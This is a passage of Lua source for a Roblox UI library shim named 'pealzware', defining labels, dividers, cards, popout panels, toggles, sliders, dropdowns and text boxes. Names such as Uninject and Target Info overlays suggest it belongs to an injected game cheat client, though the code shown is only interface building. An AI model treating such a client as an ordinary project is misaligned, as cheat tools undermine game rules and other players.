                                            if not self then return end
                                            local want = v and true or false
                                            if want ~= self.Enabled then
                                                self:Toggle()
                                            end
                                            self.Value = self.Enabled
                                        end
                                    end
                                    -- Keep Value in sync when Toggle fires
                                    local _prevOF = opts.Function
                                    opts.Function = function(...)
                                        ctrl.Value = ctrl.Enabled
                                        if type(_prevOF) == 'function' then pcall(_prevOF, ...) end
                                    end
                                end
                            end
                            return ctrl
                        end
                    end
                end

                -- CreateLabel: modern.lua has no Label component so it's never generated
                -- by the Create* loop. Provide it manually using mod.Children.
                mod.CreateLabel = function(self3, s)
                    local _lbl_api = { Value = '' }
                    pcall(function()
                        local _mc = mod.Children
                        if not _mc then return end
                        s = type(s) == 'table' and s or { Text = tostring(s or '') }
                        s = _normalizeLegacyControlOptions('Label', s)
                        local _lbl = Instance.new('TextLabel')
                        _lbl.Size = UDim2.new(1, -8, 0, 18)
                        _lbl.BackgroundTransparency = 1
                        _lbl.Text = s.Text or ''
                        _lbl.TextColor3 = _pal.Text
                        _lbl.TextSize = 11
                        _lbl.FontFace = _pal.Font
                        _lbl.TextXAlignment = Enum.TextXAlignment.Left
                        _lbl.TextWrapped = true
                        _lbl.Parent = _mc
                        _lbl_api.Object = _lbl
                        _lbl_api.Value  = _lbl.Text
                        function _lbl_api:SetText(t)
                            _lbl.Text = tostring(t or '')
                            self.Value = _lbl.Text
                        end
                    end)
                    return _lbl_api
                end

                -- Fix CreateDivider: its component signature is Divider(children, text)
                -- but the generic Create* loop generates function(_, opts) → v(opts, modulechildren).
                -- This swaps children/text, causing Frame:upper() crash when text = modulechildren.
                -- modern.lua stores modulechildren as mod.Children (line 4353), so we can call
                -- the Divider function correctly ourselves.
                mod.CreateDivider = function(self3, text)
                    pcall(function()
                        local _mc = mod.Children
                        if not _mc then return end
                        local d = Instance.new('Frame')
                        d.Name = 'Divider'
                        d.Size = UDim2.new(1, 0, 0, 1)
                        d.BackgroundColor3 = Color3.fromRGB(255,255,255)
                        d.BackgroundTransparency = 0.9
                        d.BorderSizePixel = 0
                        if text and type(text) == 'string' and #text > 0 then
                            local lbl = Instance.new('TextLabel')
                            lbl.Name = 'DividerLabel'
                            lbl.Size = UDim2.fromOffset(218, 27)
                            lbl.BackgroundTransparency = 1
                            lbl.Text = '          '..text:upper()
                            lbl.TextXAlignment = Enum.TextXAlignment.Left
                            lbl.TextColor3 = Color3.fromRGB(255,255,255)
                            lbl.TextTransparency = 0.43
                            lbl.TextSize = 9
                            lbl.Parent = _mc
                            d.Position = UDim2.fromOffset(0, 26)
                            d.Parent = lbl
                        else
                            d.Parent = _mc
                        end
                    end)
                end

                if mod.CreateTextBox and not mod.CreateInput then
                    mod.CreateInput = function(self3, opts)
                        return self3:CreateTextBox(_normalizeLegacyControlOptions('TextBox', opts))
                    end
                end
                if mod.CreateTextBox and not mod.CreateTextbox then
                    mod.CreateTextbox = mod.CreateTextBox
                end

                return mod
            end
        end
        return cat
    end -- Library:CreateCategory

end -- shim do-block

-- Add Card control
Library.Controls['Card'] = function(settings, children, api, lib)
    local card = Instance.new('Frame')
    card.Size = UDim2.new(1, 0, 0, settings.Height or 40)
    card.BackgroundTransparency = 1
    card.BorderSizePixel = 0
    card.Parent = children

    local badge
    if settings.Badge then
        badge = Instance.new('TextLabel')
        badge.Size = UDim2.fromOffset(50, 20)
        badge.Position = UDim2.fromOffset(10, 10)
        badge.BackgroundColor3 = lib.Palette.AccentColor
        badge.Text = settings.Badge
        badge.TextColor3 = lib.Palette.Text
        badge.TextSize = 12
        badge.FontFace = lib.Palette.Font
        badge.Parent = card
        lib.Utility.AddCorner(badge, UDim.new(0, 4))
    end

    local left
    if settings.LeftText then
        left = Instance.new('TextLabel')
        left.Size = UDim2.new(1, -140, 0, 20)
        left.Position = UDim2.fromOffset(70, 10)
        left.BackgroundTransparency = 1
        left.Text = settings.LeftText
        left.TextColor3 = lib.Palette.Text
        left.TextSize = 14
        left.FontFace = lib.Palette.Font
        left.TextXAlignment = Enum.TextXAlignment.Left
        left.Parent = card
    end

    local sub
    if settings.Subtitle then
        sub = Instance.new('TextLabel')
        sub.Size = UDim2.new(1, -140, 0, 20)
        sub.Position = UDim2.fromOffset(70, 30)
        sub.BackgroundTransparency = 1
        sub.Text = settings.Subtitle
        sub.TextColor3 = lib.Color.Dark(lib.Palette.Text, 0.5)
        sub.TextSize = 12
        sub.FontFace = lib.Palette.Font
        sub.TextXAlignment = Enum.TextXAlignment.Left
        sub.Parent = card
    end

    local btn
    if settings.Button then
        btn = Instance.new('TextButton')
        btn.Size = UDim2.fromOffset(60, 30)
        btn.Position = UDim2.new(1, -70, 0, 13)
        btn.BackgroundColor3 = settings.Button.Color or lib.Palette.AccentColor
        btn.Text = settings.Button.Text
        btn.TextColor3 = lib.Palette.Text
        btn.TextSize = 12
        btn.FontFace = lib.Palette.Font
        btn.Parent = card
        lib.Utility.AddCorner(btn, UDim.new(0, 4))
        btn.MouseButton1Click:Connect(function()
            if settings.Button.Func then
                settings.Button.Func()
            end
        end)
        btn.MouseEnter:Connect(function()
            btn.BackgroundColor3 = settings.Button.HoverColor or lib.Color.Light(lib.Palette.AccentColor, 0.2)
        end)
        btn.MouseLeave:Connect(function()
            btn.BackgroundColor3 = settings.Button.Color or lib.Palette.AccentColor
        end)
    end

    local cardApi = {
        SetBadge = function(self, text)
            if badge then badge.Text = text end
        end,
        SetSubtitle = function(self, text)
            if sub then sub.Text = text end
        end,
        SetLeftText = function(self, text)
            if left then left.Text = text end
        end,
        SetThumbnails = function(self, urls)
            if urls and #urls > 0 then
                local img = Instance.new('ImageLabel')
                img.Size = UDim2.fromOffset(40, 40)
                img.Position = UDim2.fromOffset(10, 8)
                img.BackgroundTransparency = 1
                img.Image = urls[1]
                img.Parent = card
                lib.Utility.AddCorner(img, UDim.new(0, 4))
            end
        end,
        SetVisible = function(self, vis)
            card.Visible = vis
        end,
        SetBadgeColor = function(self, col)
            if badge then badge.BackgroundColor3 = col end
        end,
    }
    return cardApi
end

-- Overlay bar: let modern.lua's real CreateOverlayBar run (previously stubbed out,
-- which broke Text GUI / Target Info overlays and left a blank bar in the sidebar)


-- Fix search to include all modules across all categories instead of just paint bad ew
local origCreateSearch = Library.CreateSearch
function Library:CreateSearch()
    if self.Search then
        return self.Search
    end
    local search = origCreateSearch(self)
    self.Search = search
    return self.Search
end

local origCreatePopout = Library.CreatePopout
Library.CreatePopout = function(self, title, text, buttons)
    local popout = origCreatePopout(self, title, text, buttons)
    
    function popout:AddGroupbox(name)
        local groupbox = Instance.new('Frame')
        groupbox.Size = UDim2.new(1, 0, 0, 0)
        groupbox.BackgroundTransparency = 1
        groupbox.BorderSizePixel = 0
        groupbox.Parent = self.Object:FindFirstChild('ScrollingFrame') or self.Object
        
        local layout = Instance.new('UIListLayout')
        layout.SortOrder = Enum.SortOrder.LayoutOrder
        layout.Padding = UDim.new(0, 4)
        layout.Parent = groupbox
        
        local gb = {
            Object = groupbox,
            Container = groupbox,
            _controls = {},
            Children = groupbox,
        }
        
        function gb:CreateLabel(text)
            local label = Instance.new('TextLabel')
            label.Size = UDim2.new(1, 0, 0, 20)
            label.BackgroundTransparency = 1
            label.Text = text
            label.TextColor3 = Library.Palette.Text
            label.TextSize = 12
            label.FontFace = Library.Palette.Font
            label.TextXAlignment = Enum.TextXAlignment.Left
            label.Parent = groupbox
            
            local obj = {
                Object = label,
                SetText = function(self, newText)
                    label.Text = newText
                end
            }
            table.insert(self._controls, obj)
            layout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
                groupbox.Size = UDim2.new(1, 0, 0, layout.AbsoluteContentSize.Y)
            end)
            return obj
        end
        
        function gb:CreateDivider()
            local div = Instance.new('Frame')
            div.Size = UDim2.new(1, 0, 0, 1)
            div.BackgroundColor3 = Library.Palette.Text
            div.BackgroundTransparency = 0.9
            div.BorderSizePixel = 0
            div.Parent = groupbox
            return div
        end
        
        function gb:CreateButton(opts)
            local btn = Instance.new('TextButton')
            btn.Size = UDim2.new(1, 0, 0, 28)
            btn.BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.1)
            btn.Text = opts.Text or 'Button'
            btn.TextColor3 = Library.Palette.Text
            btn.TextSize = 12
            btn.FontFace = Library.Palette.Font
            btn.Parent = groupbox
            Library.Utility.AddCorner(btn, UDim.new(0, 4))
            
            btn.MouseButton1Click:Connect(function()
                if opts.Func then opts.Func() end
            end)
            table.insert(self._controls, btn)
            layout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
                groupbox.Size = UDim2.new(1, 0, 0, layout.AbsoluteContentSize.Y)
            end)
            return btn
        end
        
        function gb:CreateCard(opts)
            local card = Library.Controls.Card(opts, groupbox, nil, Library)
            table.insert(self._controls, card)
            layout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
                groupbox.Size = UDim2.new(1, 0, 0, layout.AbsoluteContentSize.Y)
            end)
            return card
        end
        
        function gb:Resize()
            layout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
                groupbox.Size = UDim2.new(1, 0, 0, layout.AbsoluteContentSize.Y)
            end)
        end
        
        table.insert(self._groupboxes or {}, gb)
        return gb
    end
    
    function popout:CreateToggleButton(text)
        local btn = Instance.new('TextButton')
        btn.Size = UDim2.fromOffset(32, 32)
        btn.Position = UDim2.fromOffset(10, 4)
        btn.BackgroundColor3 = Library.Palette.Main
        btn.Text = ''
        btn.Parent = self.Object
        Library.Utility.AddCorner(btn, UDim.new(0, 6))
        return btn
    end
    
    return popout
end
ThemeManager = Library.ThemeManager
SaveManager = Library.SaveManager


-- === Utility Functions (PealzwareUI native compatibility) ===

function Library:Create(class, props)
    local _inst = Instance.new(class)
    local _parent
    for k, v in pairs(props or {}) do
        if k == 'Parent' then _parent = v
        else pcall(function() _inst[k] = v end) end
    end
    if _parent then _inst.Parent = _parent end
    return _inst
end

local _origNotify = Library.Notify
function Library:Notify(a, b, c, d)
    if c ~= nil or d ~= nil then
        return _origNotify(self, a, b, c, d)
    end
    if type(a) == 'string' and type(b) == 'string' then
        return _origNotify(self, a, b, 3)
    end
    local _text = tostring(a or '')
    local _dur  = type(b) == 'number' and b or 3
    return _origNotify(self, self.Name or 'pealzware', _text, _dur)
end

Library.Unloaded = false
Library._unloadCallbacks = {}
function Library:OnUnload(callback)
    if type(callback) == 'function' then
        table.insert(self._unloadCallbacks, callback)
    end
end
local _origUninject = Library.Uninject
function Library:Uninject(skipSave)
    self.Unloaded = true
    for _, cb in ipairs(self._unloadCallbacks) do
        pcall(cb)
    end
    return _origUninject(self, skipSave)
end
function Library:Unload(skipSave) self:Uninject(skipSave) end


local _paletteKeyMap = {
    FontColor       = 'Text',
    MainColor       = 'Main',
    AccentColor     = 'AccentColor',
    OutlineColor    = 'OutlineColor',
    BackgroundColor = 'BackgroundColor',
}
function Library:AddToRegistry(inst, props)
    if not inst or not props then return end
    local _mapped = {}
    for k, v in pairs(props) do
        _mapped[k] = (type(v) == 'string' and _paletteKeyMap[v]) or v
    end
    pcall(function() self.Registry:Add(inst, _mapped) end)
end


-- Each popout's toggle button needs a unique horizontal position so they don't overlap.
-- Buttons are 70px wide with 6px gap between them, right-aligned in Library.ScaledGui.
local _popoutToggleCount = 0

function Library:CreatePopout(opts)
    opts = opts or {}
    if type(opts) ~= 'table' then return nil end

    local _panel = Instance.new('TextButton')
    _panel.Name = opts.Title or 'Popout'
    _panel.Size = opts.Size or UDim2.fromOffset(380, 520)
    _panel.Position = opts.Position or UDim2.fromOffset(700, 40)
    _panel.BackgroundColor3 = Library.Color.Dark(Library.Palette.Main, 0.02)
    _panel.AutoButtonColor = false
    _panel.Visible = false
    _panel.Text = ''
    _panel.ZIndex = 10
    _panel.Parent = Library.ScaledGui
    Library.Utility.AddBlur(_panel)
    Library.Utility.AddCorner(_panel, UDim.new(0, 8))
    -- Accent glow border
    local _panelStroke = Instance.new('UIStroke')
    _panelStroke.Color = Library.Palette.AccentColor
    _panelStroke.Thickness = 1.2
    _panelStroke.Transparency = 0.5
    _panelStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    _panelStroke.Parent = _panel
    -- Top-edge highlight glow strip
    local _panelGlow = Instance.new('Frame')
    _panelGlow.Name = '_accentGlow'
    _panelGlow.Size = UDim2.new(0.6, 0, 0, 2)
    _panelGlow.Position = UDim2.new(0.2, 0, 0, 0)
    _panelGlow.BackgroundColor3 = Library.Palette.AccentColor
    _panelGlow.BackgroundTransparency = 0.2
    _panelGlow.BorderSizePixel = 0
    _panelGlow.ZIndex = 12
    _panelGlow.Parent = _panel
    Instance.new('UICorner', _panelGlow).CornerRadius = UDim.new(1, 0)
    Library.Utility.MakeDraggable(_panel)

    local _header = Instance.new('TextLabel')
    _header.Size = UDim2.new(1, -20, 0, 28)
    _header.Position = UDim2.fromOffset(10, 6)
    _header.BackgroundTransparency = 1
    _header.Text = opts.Title or 'Popout'
    _header.TextColor3 = Library.Palette.Text
    _header.TextSize = 14
    _header.FontFace = Library.Palette.FontSemiBold or Library.Palette.Font
    _header.TextXAlignment = Enum.TextXAlignment.Left
    _header.ZIndex = 11
    _header.Parent = _panel

    local _scroll = Instance.new('ScrollingFrame')
    _scroll.Size = UDim2.new(1, -8, 1, -38)
    _scroll.Position = UDim2.fromOffset(4, 34)
    _scroll.BackgroundTransparency = 1
    _scroll.BorderSizePixel = 0
    _scroll.ScrollBarThickness = 2
    _scroll.ScrollBarImageTransparency = 0.75
    _scroll.CanvasSize = UDim2.new()
    _scroll.ZIndex = 11
    _scroll.Parent = _panel

    local _layout = Instance.new('UIListLayout')
    _layout.SortOrder = Enum.SortOrder.LayoutOrder
    _layout.Padding = UDim.new(0, 4)
    _layout.Parent = _scroll
    _layout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
        _scroll.CanvasSize = UDim2.fromOffset(0, _layout.AbsoluteContentSize.Y + 8)
    end)

    local popoutApi = { Object = _panel, gui = _panel }

    function popoutApi:AddGroupbox(name)
        local _grpFrame = Instance.new('Frame')
        _grpFrame.Size = UDim2.new(1, -8, 0, 0)
        _grpFrame.AutomaticSize = Enum.AutomaticSize.Y
        _grpFrame.BackgroundTransparency = 1
        _grpFrame.BorderSizePixel = 0
        _grpFrame.ZIndex = 12
        _grpFrame.Parent = _scroll

        local _grpTitle = Instance.new('TextLabel')
        _grpTitle.Size = UDim2.new(1, 0, 0, 22)
        _grpTitle.BackgroundTransparency = 1
        _grpTitle.Text = '   ' .. (name or '')
        _grpTitle.TextXAlignment = Enum.TextXAlignment.Left
        _grpTitle.TextColor3 = Library.Color.Dark(Library.Palette.Text, 0.3)
        _grpTitle.TextSize = 11
        _grpTitle.FontFace = Library.Palette.Font
        _grpTitle.ZIndex = 12
        _grpTitle.Parent = _grpFrame

        local _grpContent = Instance.new('Frame')
        _grpContent.Size = UDim2.new(1, 0, 0, 0)
        _grpContent.AutomaticSize = Enum.AutomaticSize.Y
        _grpContent.Position = UDim2.fromOffset(0, 22)
        _grpContent.BackgroundTransparency = 1
        _grpContent.ZIndex = 12
        _grpContent.Parent = _grpFrame

        local _grpList = Instance.new('UIListLayout')
        _grpList.SortOrder = Enum.SortOrder.LayoutOrder
        _grpList.Padding = UDim.new(0, 2)
        _grpList.Parent = _grpContent

        local grpApi = {
            Object    = _grpFrame,
            Children  = _grpContent,
            Container = _grpContent,  -- alias used by Enlighten/Builds manual card builders
        }

        function grpApi:CreateButton(s)
            s = s or {}
            s.Function = s.Function or s.Callback or s.Func
            local _btn = Instance.new('TextButton')
            _btn.Size = UDim2.new(1, -8, 0, 26)
            local _gbBase = Library.Color.Light(Library.Palette.Main, 0.07)
            _btn.BackgroundColor3 = _gbBase
            _btn.Text = s.Name or 'Button'
            _btn.TextColor3 = Library.Palette.Text
            _btn.TextSize = 12
            _btn.FontFace = Library.Palette.Font
            _btn.BorderSizePixel = 0
            _btn.ZIndex = 13
            _btn.Parent = _grpContent
            Library.Utility.AddCorner(_btn, UDim.new(0, 4))
            local _tsGb = game:GetService('TweenService')
            local _gbHover = Library.Color.Light(Library.Palette.Main, 0.16)
            _btn.MouseEnter:Connect(function()
                _tsGb:Create(_btn, TweenInfo.new(0.1), { BackgroundColor3 = _gbHover }):Play()
            end)
            _btn.MouseLeave:Connect(function()
                _tsGb:Create(_btn, TweenInfo.new(0.1), { BackgroundColor3 = _gbBase }):Play()
            end)
            _btn.MouseButton1Down:Connect(function()
                _tsGb:Create(_btn, TweenInfo.new(0.05), { BackgroundColor3 = Library.Palette.AccentColor }):Play()
            end)
            _btn.MouseButton1Up:Connect(function()
                _tsGb:Create(_btn, TweenInfo.new(0.1), { BackgroundColor3 = _gbHover }):Play()
            end)
            if s.Function then
                _btn.MouseButton1Click:Connect(function()
                    if Library._playUiSound then Library._playUiSound('Button') end
                    pcall(s.Function)
                end)
            end
            local _api = { Object = _btn, Type = 'Button' }
            function _api:SetText(t) _btn.Text = tostring(t or '') end
            function _api:SetVisible(v) _btn.Visible = v == true end
            function _api:CreateButton(opts2)
                opts2 = opts2 or {}
                return grpApi:CreateButton({
                    Name = opts2.Text or opts2.Name or 'Button',
                    Function = opts2.Func or opts2.Function or opts2.Callback,
                })
            end
            return _api
        end

        function grpApi:CreateToggle(s)
            s = s or {}
            local _row = Instance.new('Frame')
            _row.Size = UDim2.new(1, -8, 0, 26)
            _row.BackgroundTransparency = 1
            _row.ZIndex = 13
            _row.Parent = _grpContent

            local _lbl = Instance.new('TextLabel')
            _lbl.Size = UDim2.new(1, -36, 1, 0)
            _lbl.BackgroundTransparency = 1
            _lbl.Text = s.Name or ''
            _lbl.TextColor3 = Library.Palette.Text
            _lbl.TextSize = 12
            _lbl.FontFace = Library.Palette.Font
            _lbl.TextXAlignment = Enum.TextXAlignment.Left
            _lbl.ZIndex = 13
            _lbl.Parent = _row

            -- Apple-style toggle track + pip
            local _track = Instance.new('TextButton')
            _track.Size = UDim2.fromOffset(30, 17)
            _track.AnchorPoint = Vector2.new(1, 0.5)
            _track.Position = UDim2.new(1, -4, 0.5, 0)
            _track.BackgroundColor3 = s.Default and Library.Palette.AccentColor or Color3.fromRGB(55,55,60)
            _track.Text = ''
            _track.ZIndex = 14
            _track.Parent = _row
            Library.Utility.AddCorner(_track, UDim.new(1, 0))
            local _pip = Instance.new('Frame')
            _pip.Size = UDim2.fromOffset(11, 11)
            _pip.AnchorPoint = Vector2.new(0.5, 0.5)
            _pip.Position = s.Default and UDim2.new(0.75, 0, 0.5, 0) or UDim2.new(0.28, 0, 0.5, 0)
            _pip.BackgroundColor3 = Color3.new(1,1,1)
            _pip.BorderSizePixel = 0
            _pip.ZIndex = 15
            _pip.Parent = _track
            Library.Utility.AddCorner(_pip, UDim.new(1, 0))

            local _tsTog = game:GetService('TweenService')
            local _offColor = Color3.fromRGB(55,55,60)
            local _val = s.Default == true
            local _api = { Value = _val, Type = 'Toggle' }
            function _api:SetValue(v)
                _val = v == true
                self.Value = _val
                _tsTog:Create(_track, TweenInfo.new(0.16, Enum.EasingStyle.Quart),
                    { BackgroundColor3 = _val and Library.Palette.AccentColor or _offColor }):Play()
                _tsTog:Create(_pip, TweenInfo.new(0.16, Enum.EasingStyle.Quart),
                    { Position = _val and UDim2.new(0.75,0,0.5,0) or UDim2.new(0.28,0,0.5,0) }):Play()
                if s.Function then pcall(s.Function, _val) end
            end
            function _api:OnChanged(fn)
                local _prev = s.Function or function() end
                s.Function = function(v) _prev(v); fn(v) end
                return self
            end
            _track.MouseButton1Click:Connect(function()
                if Library._playUiSound then Library._playUiSound('Toggle') end
                _api:SetValue(not _val)
            end)
            return _api
        end

        function grpApi:CreateSlider(s)
            s = s or {}
            local _row = Instance.new('Frame')
            _row.Size = UDim2.new(1, -8, 0, 36)
            _row.BackgroundTransparency = 1
            _row.ZIndex = 13
            _row.Parent = _grpContent

            local _lbl = Instance.new('TextLabel')
            _lbl.Size = UDim2.new(1, 0, 0, 16)
            _lbl.BackgroundTransparency = 1
            _lbl.Text = s.Name or ''
            _lbl.TextColor3 = Library.Palette.Text
            _lbl.TextSize = 11
            _lbl.FontFace = Library.Palette.Font
            _lbl.TextXAlignment = Enum.TextXAlignment.Left
            _lbl.ZIndex = 13
            _lbl.Parent = _row

            local _track = Instance.new('Frame')
            _track.Size = UDim2.new(1, 0, 0, 6)
            _track.Position = UDim2.fromOffset(0, 20)
            _track.BackgroundColor3 = Color3.fromRGB(50,50,50)
            _track.ZIndex = 13
            _track.Parent = _row
            Library.Utility.AddCorner(_track, UDim.new(1, 0))

            local _fill = Instance.new('Frame')
            _fill.Size = UDim2.fromScale(0.5, 1)
            _fill.BackgroundColor3 = Library.Palette.AccentColor
            _fill.ZIndex = 14
            _fill.Parent = _track
            Library.Utility.AddCorner(_fill, UDim.new(1, 0))

            local _val = s.Default or s.Min or 0
            local _api = { Value = _val, Type = 'Slider' }
            function _api:SetValue(v)
                _val = math.clamp(v, s.Min or 0, s.Max or 100)
                self.Value = _val
                local _pct = (_val - (s.Min or 0)) / math.max(1, (s.Max or 100) - (s.Min or 0))
                _fill.Size = UDim2.fromScale(_pct, 1)
                _lbl.Text = (s.Name or '') .. ': ' .. tostring(_val)
                if s.Function then pcall(s.Function, _val) end
            end
            function _api:OnChanged(fn)
                local _prev = s.Function or function() end
                s.Function = function(v) _prev(v); fn(v) end
                return self
            end
            _api:SetValue(_val)
            return _api
        end

        function grpApi:CreateDropdown(s)
            s = s or {}
            s.Function = s.Function or s.Callback or s.Func
            local _list = s.List or s.Options or s.Values or {}
            if type(_list) ~= 'table' then
                _list = {}
            end
            local _val = s.Default or _list[1] or ''
            if type(_val) == 'number' and _list[_val] ~= nil then
                _val = _list[_val]
            end
            local _row = Instance.new('Frame')
            _row.Size = UDim2.new(1, -8, 0, 26)
            _row.BackgroundTransparency = 1
            _row.ZIndex = 13
            _row.Parent = _grpContent

            local _btn = Instance.new('TextButton')
            _btn.Size = UDim2.new(1, 0, 1, 0)
            _btn.BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.07)
            _btn.Text = (s.Name or '') .. ': ' .. tostring(_val)
            _btn.TextColor3 = Library.Palette.Text
            _btn.TextSize = 11
            _btn.FontFace = Library.Palette.Font
            _btn.BorderSizePixel = 0
            _btn.ZIndex = 14
            _btn.Parent = _row
            Library.Utility.AddCorner(_btn, UDim.new(0, 4))

            local _api = { Value = _val, Type = 'Dropdown' }
            function _api:SetValue(v)
                _val = v
                self.Value = v
                _btn.Text = (s.Name or '') .. ': ' .. tostring(v)
                if s.Function then pcall(s.Function, v) end
            end
            function _api:Refresh(newList)
                _list = newList
            end
            function _api:OnChanged(fn)
                local _prev = s.Function or function() end
                s.Function = function(v) _prev(v); fn(v) end
                return self
            end
            return _api
        end

        function grpApi:CreateTextBox(s)
            s = s or {}
            s.Function = s.Function or s.Callback or s.Func
            local _tb = Instance.new('TextBox')
            _tb.Size = UDim2.new(1, -8, 0, 26)
            _tb.BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.07)
            _tb.PlaceholderText = s.Placeholder or s.PlaceholderText or s.Name or ''
            _tb.Text = s.Default or s.Value or ''
            _tb.TextColor3 = Library.Palette.Text
            _tb.TextSize = 12
            _tb.FontFace = Library.Palette.Font
            _tb.BorderSizePixel = 0
            _tb.ZIndex = 13
            _tb.Parent = _grpContent
            Library.Utility.AddCorner(_tb, UDim.new(0, 4))
            local _api = { Value = _tb.Text, Type = 'TextBox', Object = _tb }
            _tb:GetPropertyChangedSignal('Text'):Connect(function()
                _api.Value = _tb.Text
                if not s.Finished and s.Function then pcall(s.Function, _tb.Text) end
            end)
            _tb.FocusLost:Connect(function()
                _api.Value = _tb.Text
                if s.Finished and s.Function then pcall(s.Function, _tb.Text) end
            end)
            function _api:SetValue(v)
                _tb.Text = tostring(v or '')
                self.Value = _tb.Text
            end
            function _api:OnChanged(fn)
                local _prev = s.Function or function() end
                s.Function = function(v) _prev(v); fn(v) end
                return self
            end
            return _api
        end

        grpApi.CreateInput = grpApi.CreateTextBox

        function grpApi:CreateLabel(s)
            s = type(s) == 'table' and s or { Text = tostring(s or '') }
            local _lbl = Instance.new('TextLabel')
            _lbl.Size = UDim2.new(1, -8, 0, 18)
            _lbl.BackgroundTransparency = 1
            _lbl.Text = s.Text or ''
            _lbl.TextColor3 = Library.Color.Dark(Library.Palette.Text, 0.2)
            _lbl.TextSize = 11
            _lbl.FontFace = Library.Palette.Font
            _lbl.TextXAlignment = Enum.TextXAlignment.Left
            _lbl.TextWrapped = true
            _lbl.ZIndex = 13
            _lbl.Parent = _grpContent
            local _api = { Object = _lbl }
            function _api:SetText(t) _lbl.Text = tostring(t or '') end
            return _api
        end

        function grpApi:CreateDivider()
            local _div = Instance.new('Frame')
            _div.Size = UDim2.new(1, -8, 0, 1)
            _div.BackgroundColor3 = Library.Color.Dark(Library.Palette.OutlineColor, 0.1)
            _div.BorderSizePixel = 0
            _div.ZIndex = 13
            _div.Parent = _grpContent
        end

        function grpApi:CreateKeyPicker(s)
            return grpApi:CreateButton({
                Name = (s and s.Name or 'Keybind'),
                Function = s and s.Function,
            })
        end

        function grpApi:CreateCard(opts)
            -- Delegate to the shared Card factory defined at Library.Controls.Card
            return Library.Controls.Card(opts, _grpContent, nil, Library)
        end

        return grpApi
    end

    function popoutApi:CreateToggleButton(text, extraOpts)
        -- Stack buttons vertically along the right edge so they don't overlap
        -- the navigation panel (which spans the left ~226px of ScaledGui).
        extraOpts = extraOpts or {}
        local _slot = _popoutToggleCount
        _popoutToggleCount = _popoutToggleCount + 1

        -- Outer container gives a dark pill background; inner label shows icon + text.
        local _togOuter = Instance.new('Frame')
        _togOuter.Name = 'PopoutToggle_' .. (text or 'Btn')
        _togOuter.Size = UDim2.fromOffset(82, 30)
        _togOuter.Position = UDim2.new(1, -92, 0, 6 + _slot * 36)
        _togOuter.BackgroundColor3 = Library.Color.Dark(Library.Palette.Main, 0.02)
        _togOuter.BorderSizePixel = 0
        _togOuter.ZIndex = 10
        _togOuter.Parent = Library.ScaledGui
        Library.Utility.AddBlur(_togOuter)
        Library.Utility.AddCorner(_togOuter, UDim.new(0, 7))
        -- Accent border glow
        local _togStroke = Instance.new('UIStroke')
        _togStroke.Color = Library.Palette.AccentColor
        _togStroke.Thickness = 1.2
        _togStroke.Transparency = 0.45
        _togStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        _togStroke.Parent = _togOuter
        -- Clickable area (fills parent)
        local _togBtn = Instance.new('TextButton')
        _togBtn.Size = UDim2.fromScale(1, 1)
        _togBtn.BackgroundTransparency = 1
        _togBtn.BorderSizePixel = 0
        _togBtn.AutoButtonColor = false
        _togBtn.Text = ''
        _togBtn.ZIndex = 11
        _togBtn.Parent = _togOuter
        -- Label
        local _togLabel = Instance.new('TextLabel')
        _togLabel.Size = UDim2.fromScale(1, 1)
        _togLabel.Position = UDim2.fromOffset(0, 0)
        _togLabel.BackgroundTransparency = 1
        _togLabel.Text = (extraOpts.Icon and (extraOpts.Icon .. ' ') or '') .. (text or 'Toggle')
        _togLabel.TextColor3 = Library.Palette.Text
        _togLabel.TextSize = 12
        _togLabel.FontFace = Library.Palette.FontSemiBold or Library.Palette.Font
        _togLabel.TextXAlignment = Enum.TextXAlignment.Center
        _togLabel.ZIndex = 12
        _togLabel.Parent = _togOuter
        -- Active indicator: accent dot at bottom-left
        local _activeDot = Instance.new('Frame')
        _activeDot.Size = UDim2.fromOffset(4, 4)
        _activeDot.Position = UDim2.fromOffset(6, 13)
        _activeDot.BackgroundColor3 = Library.Palette.AccentColor
        _activeDot.BackgroundTransparency = 1
        _activeDot.BorderSizePixel = 0
        _activeDot.ZIndex = 13
        _activeDot.Parent = _togOuter
        Library.Utility.AddCorner(_activeDot, UDim.new(1, 0))

        local _tsPop = game:GetService('TweenService')
        local _panelTargetSize = opts.Size or UDim2.fromOffset(380, 520)
        local _active = false

        local function _setActive(state)
            _active = state
            _tsPop:Create(_activeDot, TweenInfo.new(0.15), { BackgroundTransparency = state and 0 or 1 }):Play()
            _tsPop:Create(_togStroke, TweenInfo.new(0.15), { Transparency = state and 0.1 or 0.45 }):Play()
            _tsPop:Create(_togLabel, TweenInfo.new(0.15), {
                TextColor3 = state and Library.Palette.AccentColor or Library.Palette.Text
            }):Play()
        end

        -- Tween panel in / out
        _togBtn.MouseButton1Click:Connect(function()
            if _panel.Visible then
                _tsPop:Create(_panel,
                    TweenInfo.new(0.18, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
                    { BackgroundTransparency = 1,
                      Size = UDim2.fromOffset(_panelTargetSize.X.Offset, _panelTargetSize.Y.Offset - 16) }):Play()
                task.delay(0.18, function()
                    _panel.Visible = false
                    _panel.BackgroundTransparency = 0
                    _panel.Size = _panelTargetSize
                end)
                _setActive(false)
            else
                _panel.Size = UDim2.fromOffset(_panelTargetSize.X.Offset, _panelTargetSize.Y.Offset - 16)
                _panel.BackgroundTransparency = 1
                _panel.Visible = true
                _tsPop:Create(_panel,
                    TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                    { BackgroundTransparency = 0, Size = _panelTargetSize }):Play()
                _setActive(true)
            end
        end)
        -- Hover effects
        _togBtn.MouseEnter:Connect(function()
            _tsPop:Create(_togOuter, TweenInfo.new(0.1), {
                BackgroundColor3 = Library.Color.Light(Library.Palette.Main, 0.12)
            }):Play()
            _tsPop:Create(_togStroke, TweenInfo.new(0.1), { Transparency = 0.2 }):Play()
        end)
        _togBtn.MouseLeave:Connect(function()
            _tsPop:Create(_togOuter, TweenInfo.new(0.12), {
                BackgroundColor3 = Library.Color.Dark(Library.Palette.Main, 0.02)
            }):Play()
